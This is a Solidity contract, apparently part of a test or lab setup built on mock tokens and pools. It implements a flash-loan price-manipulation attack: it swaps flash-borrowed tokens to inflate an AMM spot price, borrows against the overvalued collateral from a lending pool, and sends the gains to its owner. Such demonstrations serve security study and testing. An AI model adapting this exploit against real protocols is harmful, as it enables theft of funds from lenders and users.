// SPDX-License-Identifier: MIT
pragma solidity 0.8.36;

import {MockERC20} from "./MockERC20.sol";
import {SimplePool} from "./SimplePool.sol";
import {FlashLoanProvider, IFlashLoanReceiver} from "./FlashLoanProvider.sol";

interface ILendable {
    function depositCollateral(uint256 amount) external;
    function borrow(uint256 amount) external;
    function collateralDeposited(
        address account
    ) external view returns (uint256);
}

contract FlashLoanAttacker is IFlashLoanReceiver {
    FlashLoanProvider public immutable provider;
    SimplePool public immutable pool;
    ILendable public immutable lendingPool;
    MockERC20 public immutable tokenA; // collateral token
    MockERC20 public immutable tokenB; // borrow token, also the flash-loaned token
    address public immutable owner;

    constructor(
        address _provider,
        address _pool,
        address _lendingPool,
        address _tokenA,
        address _tokenB
    ) {
        provider = FlashLoanProvider(_provider);
        pool = SimplePool(_pool);
        lendingPool = ILendable(_lendingPool);
        tokenA = MockERC20(_tokenA);
        tokenB = MockERC20(_tokenB);
        owner = msg.sender;
    }

    function attack(uint256 flashAmount, uint256 collateralAmount) external {
        // 1. Deposit a small amount of real collateral first.
        tokenA.transferFrom(msg.sender, address(this), collateralAmount);
        tokenA.approve(address(lendingPool), collateralAmount);
        lendingPool.depositCollateral(collateralAmount);

        // 2. Flash-borrow tokenB to fund the manipulation.
        provider.flashLoan(flashAmount, address(this), "");
    }

    function onFlashLoan(uint256 amount, bytes calldata) external override {
        // 3. Dump the flash-borrowed tokenB into the pool.
        //    This manipulates the AMM spot price of tokenA.
        tokenB.approve(address(pool), amount);
        pool.swapBForA(amount);

        // 4. Borrow against the now-inflated value of the real collateral.
        uint256 inflatedValue = (lendingPool.collateralDeposited(
            address(this)
        ) * pool.spotPriceBPerA()) / 1e18;

        lendingPool.borrow(inflatedValue);

        // 5. Repay the flash loan.
        //    The inflated borrow is slightly larger than the flash loan.
        tokenB.transfer(address(provider), amount);
    }

    function collect() external {
        tokenA.transfer(owner, tokenA.balanceOf(address(this)));
        tokenB.transfer(owner, tokenB.balanceOf(address(this)));
    }
}
